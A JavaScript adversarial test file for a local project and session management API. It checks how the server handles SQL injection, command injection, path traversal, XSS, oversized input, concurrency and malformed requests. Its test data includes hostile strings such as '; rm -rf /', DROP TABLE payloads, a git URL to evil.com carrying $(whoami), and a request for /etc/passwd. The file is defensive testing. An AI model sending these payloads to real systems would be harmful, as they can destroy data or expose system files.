const { describe, it, before } = require('node:test');
const assert = require('node:assert');
const { get, post, put, del, getTestProject } = require('./helpers');

describe('Phase H: Adversarial Testing', () => {
  let testProject;

  before(async () => {
    testProject = await getTestProject();
  });

  describe('Input Injection', () => {
    it('H01: SQL injection in project name', async () => {
      const res = await get("/api/projects/'; DROP TABLE projects; --/notes");
      assert.ok(res.status === 404 || res.status === 200); // Should not crash
      // Verify DB is intact
      const state = await get('/api/state');
      assert.ok(Array.isArray(state.body.projects));
    });

    it('H02: SQL injection in session ID', async () => {
      const res = await get("/api/sessions/'; DROP TABLE sessions; --/config");
      assert.ok(res.status === 404 || res.status === 500);
      const state = await get('/api/state');
      assert.ok(Array.isArray(state.body.projects));
    });

    it('H03: XSS in project notes', async () => {
      const state = await get('/api/state');
      const project = state.body.projects[0];
      if (!project) assert.fail('No project');
      const xss = '<script>alert("xss")</script><img onerror="alert(1)" src=x>';
      const res = await put(`/api/projects/${project.name}/notes`, { notes: xss });
      assert.strictEqual(res.status, 200);
      const read = await get(`/api/projects/${project.name}/notes`);
      // Content should be stored as-is (sanitization happens in frontend)
      assert.strictEqual(read.body.notes, xss);
      // Clean up
      await put(`/api/projects/${project.name}/notes`, { notes: '' });
    });

    it('H04: Command injection in project path', async () => {
      const res = await post('/api/projects', { path: '; rm -rf /' });
      assert.ok(res.status === 404 || res.status === 500);
    });

    it('H05: Command injection in git clone URL', async () => {
      const res = await post('/api/projects', { path: 'http://evil.com/$(whoami).git' });
      // Should fail gracefully, not execute the command
      assert.ok(res.status >= 400);
    });

    it('H06: Path traversal in project CLAUDE.md', async () => {
      const res = await get('/api/projects/../../etc/passwd/claude-md');
      assert.ok(res.status === 404 || res.status === 200);
    });

    it('H07: Null bytes in session name', async () => {
      const state = await get('/api/state');
      const project = state.body.projects.find(p => p.sessions.length > 0);
      if (!project) assert.fail('No project with sessions');
      const sessionId = project.sessions[0].id;
      const res = await put(`/api/sessions/${sessionId}/name`, { name: 'test\x00null\x00bytes' });
      assert.strictEqual(res.status, 200);
    });
  });

  describe('Boundary Values', () => {
    it('H08: Empty string for setting key', async () => {
      const res = await put('/api/settings', { key: '', value: 'x' });
      assert.ok(res.status === 200 || res.status === 400);
    });

    it('H09: Very long setting value', async () => {
      const res = await put('/api/settings', { key: 'test_long', value: 'x'.repeat(100000) });
      assert.strictEqual(res.status, 200);
    });

    it('H10: Very long session name', async () => {
      const state = await get('/api/state');
      const project = state.body.projects.find(p => p.sessions.length > 0);
      if (!project) assert.fail('No sessions');
      const sessionId = project.sessions[0].id;
      const longName = 'A'.repeat(10000);
      const res = await put(`/api/sessions/${sessionId}/name`, { name: longName });
      assert.strictEqual(res.status, 200);
      // Restore
      await put(`/api/sessions/${sessionId}/name`, { name: 'Restored' });
    });

    it('H11: Very long task text', async () => {
      const state = await get('/api/state');
      const project = state.body.projects[0];
      if (!project) assert.fail('No project');
      const res = await post(`/api/projects/${project.name}/tasks`, { text: 'T'.repeat(50000) });
      assert.strictEqual(res.status, 200);
      // Clean up
      if (res.body.id) await del(`/api/tasks/${res.body.id}`);
    });

    it('H12: Very long message content', async () => {
      const state = await get('/api/state');
      const project = state.body.projects[0];
      if (!project) assert.fail('No project');
      const res = await post(`/api/projects/${project.name}/messages`, {
        content: 'M'.repeat(100000),
        from_session: 'test',
        to_session: 'test2',
      });
      assert.strictEqual(res.status, 200);
    });

    it('H13: Empty search query', async () => {
      const res = await get('/api/search?q=');
      assert.strictEqual(res.status, 200);
      assert.deepStrictEqual(res.body.results, []);
    });

    it('H14: Search with special regex chars', async () => {
      const res = await get('/api/search?q=' + encodeURIComponent('.*+?^${}()|[]\\'));
      assert.strictEqual(res.status, 200);
      // Should not crash from regex compilation error
    });

    it('H15: Webhook with invalid URL', async () => {
      const res = await post('/api/webhooks', {
        url: 'not-a-url',
        events: ['*'],
        mode: 'event_only',
      });
      assert.strictEqual(res.status, 200); // Stored but will fail on send
      // Clean up
      await del('/api/webhooks/0');
    });

    it('H16: Negative webhook index', async () => {
      const res = await del('/api/webhooks/-1');
      assert.strictEqual(res.status, 404);
    });

    it('H17: Non-numeric webhook index', async () => {
      const res = await del('/api/webhooks/abc');
      assert.strictEqual(res.status, 404);
    });
  });

  describe('Invalid State Transitions', () => {
    it('H18: Set session state to invalid value', async () => {
      const state = await get('/api/state');
      const project = state.body.projects.find(p => p.sessions.length > 0);
      if (!project) assert.fail('No sessions');
      const sessionId = project.sessions[0].id;
      const res = await put(`/api/sessions/${sessionId}/config`, { state: 'INVALID_STATE' });
      // Should accept or reject, but not crash
      assert.ok(res.status === 200 || res.status === 400);
    });

    it('H19: Delete nonexistent task', async () => {
      const res = await del('/api/tasks/999999');
      assert.strictEqual(res.status, 200); // SQLite DELETE with no match is not an error
    });

    it('H20: Complete nonexistent task', async () => {
      const res = await put('/api/tasks/999999/complete');
      assert.strictEqual(res.status, 200); // Same — no-op UPDATE
    });

    it('H21: Resume with nonexistent project', async () => {
      const res = await post('/api/sessions/fake-id/resume', { project: 'NonExistentProject' });
      assert.ok(res.status >= 400);
    });
  });

  describe('Concurrent Operations', () => {
    it('H22: Rapid-fire session creation', async () => {
      const promises = [];
      for (let i = 0; i < 5; i++) {
        promises.push(post('/api/sessions', { project: testProject }));
      }
      const results = await Promise.all(promises);
      const successes = results.filter(r => r.status === 200);
      assert.ok(successes.length >= 1, 'At least one should succeed');
      // All should have unique IDs
      const ids = successes.map(r => r.body.id);
      const unique = new Set(ids);
      assert.strictEqual(unique.size, ids.length, 'All session IDs should be unique');
    });

    it('H23: Parallel reads and writes to settings', async () => {
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(put('/api/settings', { key: `parallel_${i}`, value: `val_${i}` }));
      }
      await Promise.all(promises);

      const settings = await get('/api/settings');
      assert.strictEqual(settings.status, 200);
      // All should be present
      for (let i = 0; i < 10; i++) {
        assert.strictEqual(settings.body[`parallel_${i}`], `val_${i}`);
      }
    });

    it('H24: Parallel task creation', async () => {
      const state = await get('/api/state');
      const project = state.body.projects[0];
      if (!project) assert.fail('No project');

      const before = await get(`/api/projects/${project.name}/tasks`);
      const beforeCount = before.body.tasks.length;

      const promises = [];
      for (let i = 0; i < 5; i++) {
        promises.push(post(`/api/projects/${project.name}/tasks`, { text: `Parallel task ${i}` }));
      }
      await Promise.all(promises);

      const after = await get(`/api/projects/${project.name}/tasks`);
      assert.strictEqual(after.body.tasks.length, beforeCount + 5);

      // Clean up
      for (const task of after.body.tasks.filter(t => t.text.startsWith('Parallel task'))) {
        await del(`/api/tasks/${task.id}`);
      }
    });
  });

  describe('API Contract Violations', () => {
    it('H25: POST with no Content-Type header', async () => {
      const http = require('http');
      const res = await new Promise((resolve, reject) => {
        const req = http.request({
          hostname: '192.168.1.110', port: 7866,
          path: '/api/sessions', method: 'POST',
          headers: { 'Connection': 'close' },
        }, (r) => {
          let data = '';
          r.on('data', c => data += c);
          r.on('end', () => resolve({ status: r.statusCode, body: data }));
        });
        req.on('error', reject);
        req.write('not json');
        req.end();
      });
      // Should not crash — should return 400 or similar
      assert.ok(res.status >= 400 || res.status === 200);
    });

    it('H26: PUT settings with non-JSON body', async () => {
      const http = require('http');
      const res = await new Promise((resolve, reject) => {
        const req = http.request({
          hostname: '192.168.1.110', port: 7866,
          path: '/api/settings', method: 'PUT',
          headers: { 'Content-Type': 'application/json', 'Connection': 'close' },
        }, (r) => {
          let data = '';
          r.on('data', c => data += c);
          r.on('end', () => resolve({ status: r.statusCode, body: data }));
        });
        req.on('error', reject);
        req.write('not json at all');
        req.end();
      });
      assert.ok(res.status >= 400);
    });

    it('H27: MCP call with missing tool field', async () => {
      const res = await post('/api/mcp/call', { args: {} });
      assert.ok(res.status >= 400);
    });

    it('H28: External MCP call with missing tool field', async () => {
      const res = await post('/api/mcp/external/call', { args: {} });
      assert.ok(res.status >= 400);
    });

    it('H29: OpenAI completion with empty messages array', async () => {
      const res = await post('/v1/chat/completions', {
        model: 'claude-sonnet-4-6',
        messages: [],
      });
      assert.strictEqual(res.status, 400);
    });

    it('H30: OpenAI completion with only assistant messages', async () => {
      const res = await post('/v1/chat/completions', {
        model: 'claude-sonnet-4-6',
        messages: [{ role: 'assistant', content: 'I am an AI' }],
      });
      assert.strictEqual(res.status, 400);
    });

    it('H31: Keepalive mode with extra fields', async () => {
      const res = await put('/api/keepalive/mode', {
        mode: 'always',
        extra: 'should be ignored',
        idleMinutes: 999,
      });
      assert.strictEqual(res.status, 200);
    });

    it('H32: WebSocket to path without session ID', async () => {
      const WebSocket = require('ws');
      const ws = new WebSocket('ws://192.168.1.110:7866/ws/');
      await new Promise((resolve) => {
        ws.on('error', () => resolve());
        ws.on('close', () => resolve());
        setTimeout(() => { ws.close(); resolve(); }, 3000);
      });
      // Should not crash the server
      const health = await get('/api/auth/status');
      assert.strictEqual(health.status, 200);
    });
  });

  describe('Resource Limits', () => {
    it('H33: Create many sessions rapidly', async () => {
      const promises = [];
      for (let i = 0; i < 3; i++) {
        promises.push(post('/api/sessions', { project: testProject }));
      }
      const results = await Promise.all(promises);
      // Server should handle without crashing
      const health = await get('/api/auth/status');
      assert.strictEqual(health.status, 200);
    });

    it('H34: Large webhook payload', async () => {
      await post('/api/webhooks', {
        url: 'http://httpbin.org/post',
        events: ['*'],
        mode: 'full_content',
      });

      // Fire event with large data
      const state = await get('/api/state');
      const project = state.body.projects[0];
      if (!project) assert.fail('No project');
      await post(`/api/projects/${project.name}/messages`, {
        content: 'X'.repeat(50000),
        from_session: 'test',
      });

      // Server should not crash
      const health = await get('/api/auth/status');
      assert.strictEqual(health.status, 200);

      // Clean up webhooks
      const hooks = await get('/api/webhooks');
      for (let i = hooks.body.webhooks.length - 1; i >= 0; i--) {
        await del(`/api/webhooks/${i}`);
      }
    });
  });
});
